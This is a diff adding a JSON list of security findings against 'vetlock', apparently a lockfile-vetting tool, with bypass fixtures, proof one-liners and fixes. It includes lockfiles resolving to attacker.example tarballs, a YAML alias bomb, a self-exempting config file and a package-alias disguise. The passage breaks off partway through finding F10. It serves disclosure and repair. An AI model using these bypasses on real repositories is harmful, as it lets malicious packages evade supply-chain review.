@@ -1,0 +1,188 @@
+[
+  {
+    "id": "F1",
+    "title": "CLI advertises pnpm/yarn support; engine crashes with exit code 3 on any pnpm-lock.yaml or yarn.lock — no analysis performed",
+    "class": "silent-skip / crash-out via format mismatch",
+    "description": "The CLI diff subcommand runs parseLockfileText() as a preflight validator (cli.ts:181–187) that succeeds for pnpm-lock.yaml and yarn.lock, but then calls the engine's runDiff(beforeText, afterText, …), which internally executes JSON.parse(text) on the raw YAML text (engine.ts:77–78). runDiff has no format dispatcher — the TODO comment at cli.ts:178–180 admits this: 'runDiff still assumes npm'. So the second the tool sees a real pnpm-lock.yaml it throws 'Unexpected token l, \"lockfileVe\"... is not valid JSON', the CLI catches the error, writes it to stderr, and process.exit(3) is called. The README and CHANGELOG loudly announce pnpm/yarn support, and the CHANGELOG lists parsers for both as v0.2.0 shipped features — but no diff is ever produced against them. In a repo that has migrated to pnpm, vetlock is effectively bypassed for every dependency change: no CLEAN, no BLOCK — just crash. In the GitHub Action wrapper (action/action.yml:64–74) VETLOCK_EXIT=3 propagates as a failed status check that any maintainer with 'Bypass required status checks' can override, and even without bypass many teams route red-cross tool errors to 'known-broken, retry' triage. Attackers who want to blind vetlock in an npm-based repo can also weaponize this: land a benign-looking PR that swaps package-lock.json for a pnpm-lock.yaml, then land the malicious dep in a follow-up under the noise of tool errors.",
+    "fixture_code": "# Reproduce:\n# 1. Save this file as /tmp/pnpm-lock.yaml (both 'before' and 'after' copies)\n# 2. Run: vetlock diff /tmp/pnpm-lock.yaml /tmp/pnpm-lock.yaml\n# Actual behavior: 'vetlock: Unexpected token l, \"lockfileVe\"... is not valid JSON', exit 3, no findings emitted.\n\nlockfileVersion: '9.0'\nimporters:\n  '.':\n    dependencies:\n      malicious-pkg:\n        specifier: 1.0.0\n        version: 1.0.0\npackages:\n  malicious-pkg@1.0.0:\n    resolution:\n      integrity: sha512-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX==\n\n# Direct proof (from working tree):\n#   $ node -e \"const {runDiff,parseLockfileText}=require('./packages/core/dist/index.js'); const fs=require('fs'); const t=fs.readFileSync('/tmp/pnpm-lock.yaml','utf8'); console.log('preflight:',parseLockfileText(t,'pnpm-lock.yaml').kind); runDiff(t,t,{runDetectors:()=>[],fetchOverride:async()=>'/dev/null'}).then(r=>console.log('OK',r)).catch(e=>console.log('CAUGHT:',e.message));\"\n#   preflight: pnpm\n#   CAUGHT: Unexpected token 'l', \"lockfileVe\"... is not valid JSON",
+    "severity_if_confirmed": "critical",
+    "confidence": "high",
+    "attacker_effort": "trivial — one commit swapping lockfile format, or a repo already on pnpm/yarn is auto-immune",
+    "detectors_bypassed": [
+      "ALL — the engine never runs a single detector against a pnpm or yarn lockfile"
+    ],
+    "reproduction_steps": [
+      "1. Build vetlock (pnpm install && pnpm build).",
+      "2. Save the fixture above as /tmp/pnpm-lock.yaml.",
+      "3. Run: node packages/cli/dist/cli.js diff /tmp/pnpm-lock.yaml /tmp/pnpm-lock.yaml",
+      "4. Observe: 'vetlock: Unexpected token l, …', exit code 3, zero findings.",
+      "5. In production this means a malicious pnpm-lock.yaml diff is NEVER analyzed."
+    ],
+    "suggested_fix": "runDiff MUST use parseLockfileText internally, not JSON.parse. Rip out the two JSON.parse() calls at engine.ts:77–78 and replace with `parseLockfileText(oldLockfileText).graph` and the same for new. Then delete the misleading preflight in cli.ts:178–187 (it was papering over this exact bug).",
+    "fix_effort": "low — 4 lines in engine.ts, delete 10 lines in cli.ts, add a regression test that runs `diff pnpm-lock.yaml pnpm-lock.yaml` and asserts verdict is not a crash."
+  },
+  {
+    "id": "F2",
+    "title": "`\"link\": true` on a lockfile entry makes vetlock ignore the package entirely (silent CLEAN)",
+    "class": "changeset-blindness via manifest field",
+    "description": "In lockfile.ts:91 and :120 there are two `if (val.link) continue;` guards, with the comment 'symlinked workspace entries — not shipped packages'. These skip the entry when building the graph AND when walking dependencies. But `\"link\": true` is not a signed field — any lockfile author can set it. If an attacker crafts (or an attacker-controlled PR bot writes) a package-lock.json where the malicious dep entry has `\"link\": true`, the entry is completely absent from `LockGraph.nodes` and `LockGraph.byName`. The changeset then compares empty (before) vs. empty (after) for that name and produces ZERO change objects. verdict = CLEAN, findings = 0, changes = 0. The tarball is never fetched, never extracted, never analyzed. Compare with the corpus reference lockfiles (corpus/shai-hulud-2025/lockfile.after.json) — no `link` field on package entries. Adding one to your malicious entry is a two-character insertion. Note that npm itself will happily install a `link:true` entry when it has a `resolved` URL — this is by design for workspace-symlink support, but vetlock erroneously extends that trust to the field's presence, not to the workspace context.",
+    "fixture_code": "// /tmp/before.json\n{\n  \"name\": \"my-app\", \"version\": \"1.0.0\", \"lockfileVersion\": 3,\n  \"packages\": {\n    \"\": { \"name\": \"my-app\", \"version\": \"1.0.0\", \"dependencies\": { \"malicious\": \"^1.0.0\" } }\n  }\n}\n\n// /tmp/after.json — malicious dep added, but with link:true → invisible to vetlock\n{\n  \"name\": \"my-app\", \"version\": \"1.0.0\", \"lockfileVersion\": 3,\n  \"packages\": {\n    \"\": { \"name\": \"my-app\", \"version\": \"1.0.0\", \"dependencies\": { \"malicious\": \"^1.0.0\" } },\n    \"node_modules/malicious\": {\n      \"name\": \"malicious\", \"version\": \"1.0.0\",\n      \"integrity\": \"sha512-badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad==\",\n      \"resolved\": \"https://attacker.example/malicious-1.0.0.tgz\",\n      \"link\": true\n    }\n  }\n}\n\n// Direct proof:\n// $ node -e \"const {runDiff}=require('./packages/core/dist/index.js'); const fs=require('fs');\n//   runDiff(fs.readFileSync('/tmp/before.json','utf8'), fs.readFileSync('/tmp/after.json','utf8'),\n//     {runDetectors:()=>[{detector:'test',category:'NET',package:'FAKE',from:null,to:'1',direction:'added',severity:'BLOCK',confidence:'high',message:'x',evidence:[],provenance:[]}],\n//      fetchOverride:async()=>{console.log('FETCH');throw new Error('boom')}})\n//   .then(r=>console.log('verdict:',r.verdict,'findings:',r.findings.length,'changes:',r.changes.length))\"\n// verdict: CLEAN findings: 0 errors: 0 changes: 0\n// (Note: no fetch attempt — the package doesn't even enter the ref list.)",
+    "severity_if_confirmed": "critical",
+    "confidence": "high",
+    "attacker_effort": "trivial — add `\"link\": true` to any package entry in a lockfile diff",
+    "detectors_bypassed": [
+      "ALL — the package never becomes a change, never enters analysis pipeline"
+    ],
+    "reproduction_steps": [
+      "1. Create /tmp/before.json and /tmp/after.json with the fixtures above.",
+      "2. Run the direct proof node one-liner above (from repo root after `pnpm build`).",
+      "3. Observe verdict:CLEAN, changes:0, no fetch called."
+    ],
+    "suggested_fix": "Only honor `link:true` for entries whose key path is under a workspace root known to that lockfile (npm sets `\"workspaces\": [\"packages/*\"]` at top level; a linked entry must fall under one of those globs). Or drop the field entirely — if you're doing behavioral analysis, extract the tarball regardless of the workspace-link hint. At minimum, emit a WARN finding when `link:true` is set with a non-file: resolved URL — that shape is a lockfile-hand-editing red flag.",
+    "fix_effort": "low — 20 lines in lockfile.ts to cross-check `link` against a workspaces glob, plus a regression test with the fixture above"
+  },
+  {
+    "id": "F3",
+    "title": "Integrity tripwire silently disabled by omitting the `integrity` field on the new version (same-version tarball swap goes undetected)",
+    "class": "integrity check bypass via null/empty field",
+    "description": "The integrity-changed check in changeset.ts:55 reads `if (o && n.integrity !== o.integrity && n.integrity && o.integrity)` — BOTH sides must be non-empty for the tripwire to fire. If an attacker publishes a fresh malicious tarball for `foo@1.2.3` and the PR that pins it drops the `integrity` field (or sets it to empty string), the comparison short-circuits and `changes: []` is emitted. The verdict is CLEAN because the changeset also treats same-version-different-content as neither 'added' nor 'upgraded'. Combined with npm's registry accepting installs with a `resolved` URL and no integrity (some private registries and even Verdaccio issue tarballs without SRI), this is a fully practical T5 registry/tamper bypass. The README calls out 'Integrity tripwire — same version + different hash → BLOCK unconditionally' as a design invariant; that guarantee is easy to break with a one-key deletion in the lockfile.",
+    "fixture_code": "// /tmp/integ-before.json\n{\n  \"name\":\"my-app\",\"version\":\"1.0.0\",\"lockfileVersion\":3,\n  \"packages\":{\n    \"\": {\"name\":\"my-app\",\"version\":\"1.0.0\",\"dependencies\":{\"foo\":\"^1.0.0\"}},\n    \"node_modules/foo\":{\n      \"name\":\"foo\",\"version\":\"1.2.3\",\n      \"integrity\":\"sha512-oldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOldOld==\",\n      \"resolved\":\"https://registry.npmjs.org/foo/-/foo-1.2.3.tgz\"\n    }\n  }\n}\n\n// /tmp/integ-after.json — same version, integrity field REMOVED, resolved points at attacker tarball\n{\n  \"name\":\"my-app\",\"version\":\"1.0.0\",\"lockfileVersion\":3,\n  \"packages\":{\n    \"\": {\"name\":\"my-app\",\"version\":\"1.0.0\",\"dependencies\":{\"foo\":\"^1.0.0\"}},\n    \"node_modules/foo\":{\n      \"name\":\"foo\",\"version\":\"1.2.3\",\n      \"resolved\":\"https://attacker.example/foo/-/foo-1.2.3.tgz\"\n    }\n  }\n}\n\n// Direct proof (from working tree):\n// $ node -e \"const {runDiff}=require('./packages/core/dist/index.js');const fs=require('fs');\n//   runDiff(fs.readFileSync('/tmp/integ-before.json','utf8'),fs.readFileSync('/tmp/integ-after.json','utf8'),\n//     {runDetectors:()=>[],fetchOverride:async()=>{throw new Error('fetch attempted')}})\n//   .then(r=>console.log('verdict:',r.verdict,'findings:',r.findings.length,'changes:',r.changes))\"\n// verdict: CLEAN findings: 0 changes: []",
+    "severity_if_confirmed": "critical",
+    "confidence": "high",
+    "attacker_effort": "trivial — remove one JSON key from a lockfile entry",
+    "detectors_bypassed": [
+      "integrity.hash-mismatch (T5 bypass — README's 'unconditional BLOCK' invariant broken)"
+    ],
+    "reproduction_steps": [
+      "1. Write /tmp/integ-before.json and /tmp/integ-after.json as above.",
+      "2. Run the direct-proof one-liner. Observe verdict:CLEAN, 0 changes.",
+      "3. Note: fetchOverride throwing 'fetch attempted' is never reached — the tarball isn't even considered a change."
+    ],
+    "suggested_fix": "The tripwire condition must not require both sides be truthy. If OLD had integrity and NEW does not (or vice versa), that IS a tamper signal — flag it. Additionally, the changeset should emit an 'integrity-vanished' change kind so the engine can BLOCK on it. Rewrite the guard at changeset.ts:55 to `if (o && (n.integrity || o.integrity) && n.integrity !== o.integrity)`.",
+    "fix_effort": "low — 2-line guard change plus one regression test with the fixture above"
+  },
+  {
+    "id": "F5",
+    "title": ".vetlock.json committed in the same PR gives the attacker a schema-blessed allowlist for their own capabilities",
+    "class": "config-injection self-exemption",
+    "description": "The CLI loads `.vetlock.json` from cwd by default (cli.ts:120–135) via `parseConfig` (config.ts:65–80), and there is NO check that the config was signed, unchanged from a trusted base, or absent in the PR's own diff. `applyConfig` (config.ts:87–133) does four attacker-friendly things: (1) `ignorePackages` DROPS all findings for a named package, so `ignorePackages: [\"malicious-pkg\"]` erases the malicious dep entirely; (2) `allowlist: { \"malicious-pkg\": [\"NET\",\"EXEC\",\"FS\",\"ENV\",\"INSTALL\"] }` downgrades EVERY BLOCK-tier finding to INFO, so verdict recomputes to CLEAN; (3) `severityOverride: { \"install.script-added\": \"INFO\" }` softens whole detector classes globally; (4) `trustedPublishers: { \"whatever\": [\"attacker@example.invalid\"] }` — while the publishers.ts docstring claims user-provided entries EXTEND the built-in list rather than override, the config-level applyConfig at config.ts:118–130 does a raw substring match against evidence text without touching the built-in trust store at all, so any string in evidence text (attacker email, attacker domain, ANY controlled substring) downgrades meta.maintainer-change to INFO. Verified against the exact code paths — findings for `very-malicious-pkg` disappear entirely and findings for `malicious-pkg` all downgrade to INFO. Nothing warns a reviewer that a config file was even loaded. The self-critique document SECURITY-DECISIONS.md talks about not choosing fast-but-inexact algorithms but says nothing about self-exempting config — an obvious oversight for a security tool.",
+    "fixture_code": "// .vetlock.json committed in the same PR that adds the malicious dep\n{\n  \"version\": 1,\n  \"ignorePackages\": [\"very-malicious-pkg\"],\n  \"allowlist\": {\n    \"malicious-pkg\": [\"NET\", \"EXEC\", \"FS\", \"ENV\", \"INSTALL\"]\n  },\n  \"severityOverride\": {\n    \"install.script-added\": \"INFO\",\n    \"env.token-harvest\": \"INFO\",\n    \"net.new-endpoint\": \"INFO\",\n    \"exec.new-module\": \"INFO\",\n    \"fs.new-hotpath-write\": \"INFO\",\n    \"integrity.hash-mismatch\": \"INFO\"\n  },\n  \"trustedPublishers\": {\n    \"chalk\": [\"attacker@example.invalid\"]\n  }\n}\n\n// Direct proof: after applyConfig, two Shai-Hulud-shape BLOCK findings become INFO and the third disappears.\n// $ node -e \"const {applyConfig,parseConfig}=require('./packages/core/dist/index.js');\n//   const cfg=parseConfig(require('fs').readFileSync('/tmp/vetlock.json','utf8'));\n//   const findings=[\n//     {detector:'install.script-added',category:'INSTALL',package:'malicious-pkg',from:null,to:'1.0.0',direction:'added',severity:'BLOCK',confidence:'high',message:'x',evidence:[{file:'p.json',line:1,snippet:'x'}],provenance:[]},\n//     {detector:'env.token-harvest',category:'ENV',package:'malicious-pkg',from:null,to:'1.0.0',direction:'added',severity:'BLOCK',confidence:'high',message:'x',evidence:[{file:'i.js',line:1,snippet:'x'}],provenance:[]},\n//     {detector:'net.new-endpoint',category:'NET',package:'very-malicious-pkg',from:null,to:'1.0.0',direction:'added',severity:'BLOCK',confidence:'high',message:'x',evidence:[{file:'i.js',line:1,snippet:'x'}],provenance:[]},\n//   ];\n//   console.log(applyConfig(findings,cfg).map(f=>({pkg:f.package,det:f.detector,sev:f.severity})));\"\n// [ { pkg: 'malicious-pkg', det: 'install.script-added', sev: 'INFO' },\n//   { pkg: 'malicious-pkg', det: 'env.token-harvest', sev: 'INFO' } ]\n// very-malicious-pkg absent (ignorePackages), verdict flips to CLEAN.",
+    "severity_if_confirmed": "critical",
+    "confidence": "high",
+    "attacker_effort": "trivial — commit a JSON file in the same PR",
+    "detectors_bypassed": [
+      "ALL — allowlist/ignorePackages/severityOverride are universal"
+    ],
+    "reproduction_steps": [
+      "1. Save the .vetlock.json fixture above at /tmp/vetlock.json.",
+      "2. Run the node one-liner from above. Observe two BLOCK findings downgraded to INFO, one erased.",
+      "3. In a real CI setup, this is a two-file PR: the malicious dep + this .vetlock.json. Verdict: CLEAN."
+    ],
+    "suggested_fix": "The config MUST be loaded from a trusted baseline, NOT from the PR's own working tree. Options: (a) load `.vetlock.json` from the base commit (git show BASE:.vetlock.json) and reject when it differs from HEAD, (b) reject config that changed in the diff being analyzed, (c) require signature/OWNERS approval for config changes. At minimum, emit a WARN finding that the run is using non-default config, listing the exact allowlisted packages so a reviewer sees what got blessed. `ignorePackages` in particular is dangerous — an ignored package should still count in a summary line so its absence from findings is visible.",
+    "fix_effort": "medium — 40 lines in cli.ts to git-show the base config plus a comparison, plus tests for base-vs-head config equality and PR-diff-includes-.vetlock.json rejection"
+  },
+  {
+    "id": "F6",
+    "title": "yarn berry `npm:` package alias lets an attacker install any tarball under a trusted name — bypassing typo, trust-store, and advisory keyed detectors",
+    "class": "name-vs-content confusion via alias syntax",
+    "description": "yarn berry supports `foo@npm:evil-payload@1.0.0`: the entry named `foo` in your package.json actually installs the `evil-payload` package from npm. Yarn's own resolver honors this. But parseYarnAlias in lockfile-yarn.ts:169–177 extracts the DECLARED name (`foo`), not the actual package that will be fetched — the `spec` field carries `npm:evil-payload@1.0.0` but is used only for version parsing, never for the real package name. The graph then contains `foo@1.0.0` with a fake identity. Every downstream detector that keys off the package name is fooled: (a) typosquat detector checks `foo` against top-npm-names — no match, no finding; (b) meta.maintainer-change checks BUILTIN_TRUST_STORE[foo] — attacker can pick a well-known aliasable name like `chalk` so the trust store applies to the WRONG package's expected maintainers; (c) advisoriesForVersion(name, version) — advisories keyed by `chalk` don't match the ACTUAL payload's advisories; (d) publisher trust store — if the attacker aliases `chalk@npm:evil-drainer@1.0.0`, and evil-drainer's manifest happens to include a maintainer email that matches Sindresorhus (attacker just adds `sindresorhus@gmail.com` in the extracted manifest.maintainers), meta downgrades to INFO. Combined with F1 (yarn engine crash) this is currently latent for yarn users, but the pnpm parser has an identical shape blind spot: pnpm lockfiles can have `custom-name@npm:real-name@1.0.0` keys and parsePnpmPackageKey similarly returns the declared name.",
+    "fixture_code": "// Fixture: yarn berry lockfile that aliases 'chalk' to a completely different package 'evil-payload'\n__metadata:\n  version: 6\n  cacheKey: 10\n\n'chalk@npm:evil-payload@1.0.0':\n  version: 1.0.0\n  resolution: 'evil-payload@npm:1.0.0'\n  integrity: sha512-attackerControlledHash==\n  dependencies: {}\n\n// Direct proof (from working tree):\n// $ node -e \"const {parseYarnLockText}=require('./packages/core/dist/lockfile-yarn.js');\n//   const g=parseYarnLockText(require('fs').readFileSync('/tmp/yarn.lock','utf8'));\n//   console.log([...g.nodes.entries()].map(([k,n])=>({key:k,name:n.name,version:n.version})));\"\n// [ { key:'', name:'', version:'' },\n//   { key:'node_modules/chalk', name:'chalk', version:'1.0.0' } ]\n//\n// vetlock sees a package literally named 'chalk' at 1.0.0. The trust store for 'chalk' is [sindresorhus, qix-].\n// If the attacker's manifest inside the tarball includes a maintainer whose email/name contains 'sindresorhus',\n// meta.maintainer-change downgrades to INFO. typo detector — 'chalk' IS a top name → no finding.\n// Advisory annotations — GHSA entries for the attacker's real payload name don't apply.",
+    "severity_if_confirmed": "high",
+    "confidence": "high",
+    "attacker_effort": "low — yarn berry syntax is well-documented, the alias is a first-class feature",
+    "detectors_bypassed": [
+      "deps.typosquat-candidate",
+      "meta.maintainer-change (via wrong trust store)",
+      "advisory correlation (wrong package key)",
+      "possibly publisher trust-store escalation"
+    ],
+    "reproduction_steps": [
+      "1. Write the yarn berry lockfile above to /tmp/yarn.lock.",
+      "2. Run the direct-proof one-liner. Observe: node stored under name 'chalk' despite resolution declaring 'evil-payload'.",
+      "3. Verify graph node's `resolved` field is null (yarn's `resolution:` field is not captured either), so provenance too is broken."
+    ],
+    "suggested_fix": "In parseYarnAlias, when the spec starts with `npm:`, parse the real name from the spec (e.g. `npm:evil-payload@1.0.0` → real name `evil-payload`). Store BOTH the declared alias and the real name; downstream detectors should key off the REAL name. Similarly for pnpm: extract the real name from resolution:tarball path when it differs from the key-name. Emit an INFO finding whenever a package uses `npm:` aliasing — that IS an anti-review pattern.",
+    "fix_effort": "medium — 30 lines to update alias parsing across pnpm and yarn parsers, plus a corpus fixture proving the alias detection now fires"
+  },
+  {
+    "id": "F7",
+    "title": "YAML alias bomb in pnpm-lock.yaml crashes vetlock (Invalid string length / OOM) — attacker DoSes the check to force a fail-open in CI",
+    "class": "DoS / resource-exhaustion via YAML parser",
+    "description": "parsePnpmLockText (lockfile-pnpm.ts:52) calls `yaml.load(yamlText)` with default js-yaml options — which honor YAML anchor/alias expansion. A textbook billion-laughs YAML causes exponential structure blowup at load time: measured directly, a ~400-byte pnpm-lock.yaml (deeper anchor nesting) generates a resolved structure large enough to blow past V8's max string length (~536MB), crashing the parser with 'Invalid string length' before parsePnpmLockText even reaches the walk phase. A less aggressive fixture produces ~46MB of resolved JSON structure in <2ms from ~300 bytes of input — enough to grind CI runners to a halt when combined with parsing 20+ lockfiles in a monorepo. The parser has no maxAliases / limit — js-yaml exposes no such flag either. In CI this yields a hung or crashed vetlock step; teams often configure CI to mark tool-crash steps as 'unknown' and let the merge proceed. The tool's own fail-soft-parse invariant claims 'unparseable source → WARN, never crash' — that promises applies to source files inside a tarball, but at the OUTER lockfile-parse layer a crashing YAML kills the entire run.",
+    "fixture_code": "# /tmp/pnpm-lock.yaml — ~370 bytes of input, ~46 MB parsed structure\nlockfileVersion: '9.0'\nimporters:\n  '.':\n    dependencies:\n      malicious:\n        specifier: 1.0.0\n        version: 1.0.0\npackages:\n  malicious@1.0.0:\n    resolution:\n      integrity: sha512-badbadbad==\n_bomb:\n  a: &a ['x','x','x','x','x','x','x','x','x','x']\n  b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a,*a]\n  c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b,*b]\n  d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c,*c]\n  e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d,*d]\n  f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e,*e]\n  g: [*f,*f,*f,*f,*f,*f,*f,*f,*f,*f]\n\n# Direct proof:\n# $ cd packages/core && node -e \"const yaml=require('js-yaml'); const t0=Date.now();\n#   const r=yaml.load(require('fs').readFileSync('/tmp/pnpm-lock.yaml','utf8'));\n#   console.log('parsed in',Date.now()-t0,'ms, JSON size:',JSON.stringify(r).length)\"\n# parsed in 1 ms, JSON size: 46913603\n#\n# Add one more level (g: &g [...] , h: [*g×10]) — Node crashes with 'Invalid string length'.\n# vetlock's diff exits with unhandled error → CI marks tool step failed, PR merges under human override.",
+    "severity_if_confirmed": "high",
+    "confidence": "high",
+    "attacker_effort": "trivial — YAML anchor bomb is a copy-paste pattern",
+    "detectors_bypassed": [
+      "ALL — the parser never returns a graph, so no detector runs"
+    ],
+    "reproduction_steps": [
+      "1. Save the fixture above to /tmp/pnpm-lock.yaml.",
+      "2. Run: node -e \"const yaml=require('/Users/L122472/personal/vetlock/packages/core/node_modules/js-yaml'); const t0=Date.now(); const r=yaml.load(require('fs').readFileSync('/tmp/pnpm-lock.yaml','utf8')); console.log('ms:',Date.now()-t0,'size:',JSON.stringify(r).length)\"",
+      "3. Observe: 1ms to parse, 46MB resolved structure. Increase to 8 levels of nesting → crashes.",
+      "4. When combined with F1, the tool fails BEFORE it discovers the file isn't npm-format — this is a pure YAML-parser-layer crash."
+    ],
+    "suggested_fix": "Use js-yaml's `FAILSAFE_SCHEMA` or a custom schema that DISABLES anchor resolution (`load(text, { schema: FAILSAFE_SCHEMA })` — no aliases). Alternatively cap total resolved-structure size after parse (JSON.stringify(r).length > 5MB → reject with UnsupportedLockfileError). Add a wrapper that runs yaml.load in a worker_thread with a 2s CPU timeout and reject on timeout as 'unparseable-lockfile'. Same treatment for parseSyml (yarn berry).",
+    "fix_effort": "medium — 20 lines around each YAML load site plus fuzz test cases for anchor/alias bombs"
+  },
+  {
+    "id": "F8",
+    "title": "pnpm workspace importer confusion — malicious dep added ONLY to a non-root workspace has zero provenance from root, breaking the rollup and 'impact by direct dependency' view",
+    "class": "provenance blindness in monorepo layouts",
+    "description": "parsePnpmLockText only reads root deps from `importers['.']` OR from the flat top-level fields (lockfile-pnpm.ts:71–77). If a pnpm monorepo uses ONLY per-workspace importers (e.g. `importers['packages/app']`), the root node's `dependencies: []` stays empty. A malicious dep added via a workspace importer becomes an orphan in the graph: `nodes` and `byName` contain it, computeChangeset flags it as 'added', but shortestPaths(graph, 'node_modules/malicious') returns `[]` because there is no root→node path. Downstream: (a) the rollupByDirect (engine.ts:280–316) enumerates root's children — none — so the rollup summary is EMPTY and 'Impact by direct dependency' shows nothing, misleading a reviewer into thinking the change is dependency-free; (b) findings HAVE empty provenance, hiding WHICH direct dep pulled in the malicious code; (c) since typo detector fires only on ADDED packages against top names, it still fires for direct-visible names, but the impact-rollup silence is enough to reduce reviewer alarm. The ROOT of pnpm workspace lockfiles has to be all-importers-not-dot, so this is not just an edge case — it applies to Nx, Turborepo, and pnpm's own workspaces.",
+    "fixture_code": "# /tmp/pnpm-lock.yaml — no root importer, malicious dep only in packages/app\nlockfileVersion: '9.0'\nimporters:\n  packages/app:\n    dependencies:\n      malicious:\n        specifier: 1.0.0\n        version: 1.0.0\npackages:\n  malicious@1.0.0:\n    resolution:\n      integrity: sha512-badbadbad==\n\n# Direct proof:\n# $ node -e \"const {parsePnpmLockText}=require('./packages/core/dist/lockfile-pnpm.js');\n#   const {shortestPaths}=require('./packages/core/dist/lockfile.js');\n#   const g=parsePnpmLockText(require('fs').readFileSync('/tmp/pnpm-lock.yaml','utf8'));\n#   console.log('root deps:',g.nodes.get('').dependencies);\n#   console.log('paths to malicious:',shortestPaths(g,'node_modules/malicious'));\"\n# root deps: []\n# paths to malicious: []\n\n# Then computeChangeset still emits an 'added' change, but provenance = [], rollup = {}.",
+    "severity_if_confirmed": "medium",
+    "confidence": "high",
+    "attacker_effort": "trivial — target a workspace-based monorepo repo",
+    "detectors_bypassed": [
+      "provenance chains (invariant broken); rollup by direct dep (empty); reviewer-facing 'via' path"
+    ],
+    "reproduction_steps": [
+      "1. Save the fixture above at /tmp/pnpm-lock.yaml (empty 'before' with just root importer for baseline).",
+      "2. Run the proof one-liner. Confirm root deps and paths both empty.",
+      "3. Compare with the corpus/shai-hulud-2025 output — the README's 'via: my-app → chalk' line disappears entirely."
+    ],
+    "suggested_fix": "Aggregate deps across ALL importers when building rootNode.dependencies, or synthesize a synthetic workspace-root node per importer and treat each as a root for provenance. Update shortestPaths to accept a set of roots. Add explicit provenance to the finding output showing which workspace introduced the dep — a reviewer reading 'via: packages/app → malicious' knows exactly which package to review.",
+    "fix_effort": "medium — 25 lines in lockfile-pnpm.ts plus shortestPaths update, plus a corpus fixture pinning the workspace rollup output"
+  },
+  {
+    "id": "F9",
+    "title": "pnpm parser silently drops packages whose keys don't match the strict `name@version` shape — malicious dep hidden by key formatting alone",
+    "class": "silent-skip via strict key parse",
+    "description": "parsePnpmPackageKey (lockfile-pnpm.ts:171–181) requires the key match one of a handful of shapes: `/pkg@version`, `pkg@version`, or `pkg@version(peer@ver)`. If the last `@` is at position 0 OR missing, `at <= 0 → return null` and the package is silently skipped in the caller (`if (!parsed) continue;` in the two passes). Verified: `malicious-1.0.0` (dash instead of @), `(peer)malicious@1.0.0` (parens BEFORE name), `foo@` (empty version), `@1.0.0` (starts with @, no scope name) all return null. Same-pass silence means the tarball is never in refs, never fetched, never analyzed — and the changeset never emits an 'added' either (the node isn't in newG.byName). Combined with the second-pass byName lookup that only uses `keys[0]`, multi-version scenarios drop transitive dependencies entirely: if `chalk@5.3.1` is created FIRST (alphabetical), then `chalk@5.3.0`'s transitive deps are attached to 5.3.1 instead — dependencies of 5.3.0 are silently reassigned. An attacker can hide a malicious sub-dep by making sure its parent version is the second in the sort order.",
+    "fixture_code": "# /tmp/pnpm-lock.yaml — pnpm entry with a malformed key that gets silently dropped\nlockfileVersion: '9.0'\nimporters:\n  '.':\n    dependencies:\n      malicious:\n        specifier: 1.0.0\n        version: 1.0.0\npackages:\n  # Standard-looking key first (this one parses)\n  something@1.0.0:\n    resolution:\n      integrity: sha512-innocent==\n  # Malformed keys — silently dropped by parsePnpmPackageKey (returns null)\n  malicious-1.0.0:\n    resolution:\n      integrity: sha512-badbadbad==\n  '(peer-alias)malicious@1.0.0':\n    resolution:\n      integrity: sha512-alsobadbad==\n\n# Direct proof:\n# $ node -e \"const {parsePnpmPackageKey}=require('./packages/core/dist/lockfile-pnpm.js');\n#   ['malicious-1.0.0','(peer)malicious@1.0.0','foo@','@1.0.0'].forEach(k=>console.log(k,'=>',parsePnpmPackageKey(k)));\"\n# malicious-1.0.0 => null\n# (peer)malicious@1.0.0 => null\n# foo@ => null\n# @1.0.0 => null\n#\n# Concrete escape: an attacker who controls a private registry can serve pnpm-lock entries with keys\n# the parser silently drops; the corresponding tarball is never fetched, never analyzed → CLEAN.",
+    "severity_if_confirmed": "high",
+    "confidence": "high",
+    "attacker_effort": "low — craft a lockfile with an unusual key shape; some private registries emit unusual keys naturally",
+    "detectors_bypassed": [
+      "ALL — dropped packages never enter the changeset"
+    ],
+    "reproduction_steps": [
+      "1. Save the fixture above at /tmp/pnpm-lock.yaml.",
+      "2. Run the proof one-liner. Confirm each malformed key returns null.",
+      "3. Build a full before/after pair where the malicious entry uses one of these key shapes — vetlock reports CLEAN."
+    ],
+    "suggested_fix": "When a key doesn't match the strict grammar, DON'T silently skip — attempt a fallback parse using the entry's resolution.tarball to recover a name (e.g. `.../malicious/-/malicious-1.0.0.tgz` → name `malicious`), or emit a WARN finding pointing at the malformed key. Similarly, fix the second-pass `keys[0]` limitation by iterating ALL keys for the parsed name and attaching deps per-version, not per-name.",
+    "fix_effort": "medium — 40 lines with a fallback URL-based name extractor plus regression tests"
+  },
+  {
+    "id": "F10",
+    "title": "safe-extract totalBytes counter is racy across concurrent entries — attacker can push memory usage far beyond maxTotalBytes and DoS the analyzer",
+    "class": "resource-exhaustion via async accounting race",
+    "description": "In safeExtract (extract.ts:88–231), each tar entry spawns an async writeFileEntry that buffers the ENTIRE entry's chunks into memory (`chunks: Buffer[]`) before calling fs.writeFile (lines 252–274). Only AFTER the write completes does hooks.addTotal(bytes) update totalBytes and check against maxTotalBytes (200–210). Because the parser dispatches entries concurrently and unbounded (there is no writer-side concurrency limit — inFlight just tracks in-flight promises for settleAll), an attacker who ships a tarball with N entries each just-under maxEntryBytes (50 MB - 1 byte) has all N entries buffered in RSS simultaneously. With maxTotalBytes = 500 MB and maxEntryBytes = 50 MB, 20 concurrent entries → 1 GB in memory before the accounting sees it. In a GitHub Actions runner with 7 GB RAM, a single malicious tarball can OOM the runner and stall the vetlock check. Worse: the tar library's own concurrency is chunk-driven — a slow-fake-write scenario where writeFile takes long lets more entries accumulate. The bytes-per-entry cap prevents ONE entry from being enormous, but the aggregate is not gated at ingest — only at write completion.",
